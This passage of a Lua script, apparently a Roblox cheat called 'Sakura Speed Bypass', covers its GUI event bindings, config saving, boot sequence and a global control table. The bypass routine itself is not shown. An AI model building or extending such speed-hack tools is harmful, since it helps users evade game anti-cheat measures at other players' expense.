-- EVENTS
--=====================================================================
local function bindEvents()
    local r = Refs

    r.statusPill.MouseButton1Click:Connect(toggleEnabled)

    r.pcBtn.MouseButton1Click:Connect(function()
        State.mode = "PC"
        setPower(CONSTANTS.DEFAULT_POWER_PC)
        refreshMode()
        saveConfig()
    end)

    r.mobileBtn.MouseButton1Click:Connect(function()
        State.mode = "Mobile"
        setPower(CONSTANTS.DEFAULT_POWER_MOBILE)
        refreshMode()
        saveConfig()
    end)

    r.leftBtn.MouseButton1Click:Connect(function()
        setPower(State.powerValue - CONSTANTS.POWER_STEP)
    end)
    r.rightBtn.MouseButton1Click:Connect(function()
        setPower(State.powerValue + CONSTANTS.POWER_STEP)
    end)

    local function holdStep(btn, dir)
        local holding = false
        btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                holding = true
                task.spawn(function()
                    task.wait(0.35)
                    while holding do
                        setPower(State.powerValue + dir * CONSTANTS.POWER_STEP)
                        task.wait(0.08)
                    end
                end)
            end
        end)
        btn.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                holding = false
            end
        end)
    end
    holdStep(r.leftBtn, -1)
    holdStep(r.rightBtn, 1)

    r.powerBox.FocusLost:Connect(function()
        local val = tonumber(r.powerBox.Text)
        if val then setPower(val) else refreshPower() end
    end)

    if r.bgDownBtn then
        r.bgDownBtn.Activated:Connect(function()
            setBackgroundIndex(-1)
        end)
    end
    if r.bgUpBtn then
        r.bgUpBtn.Activated:Connect(function()
            setBackgroundIndex(1)
        end)
    end

    r.keyBtn.MouseButton1Click:Connect(function()
        if State.listeningKey then return end
        State.listeningKey = true
        r.keyBtn.Text = "..."
        r.keyBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
        local conn
        conn = Services.UserInput.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
            if input.KeyCode == Enum.KeyCode.Unknown then return end
            State.toggleKey = input.KeyCode
            State.listeningKey = false
            refreshKey()
            saveConfig()
            if conn then conn:Disconnect() end
        end)
    end)

    Services.UserInput.InputBegan:Connect(function(input)
        if State.listeningKey then return end
        if input.UserInputType == Enum.UserInputType.Keyboard
            and input.KeyCode == State.toggleKey then
            if Services.UserInput:GetFocusedTextBox() then return end
            toggleEnabled()
        end
    end)
end

--=====================================================================
-- BOOT
--=====================================================================
loadConfig()
buildGui()
refreshMode()
refreshStatus()
refreshPower()
refreshBackground()
refreshKey()
refreshVisibility()
refreshUIScale()
bindEvents()

if State.enabled then
    startBypass(State.powerValue)
end

_G.SakuraSpeedBypass = {
    State = State,
    Start = function()
        State.enabled = true
        refreshStatus()
        startBypass(State.powerValue)
    end,
    Stop = function()
        State.enabled = false
        refreshStatus()
        stopBypass()
    end,
    SetPower = setPower,
}

print("[SAKURA] Speed Bypass loaded")
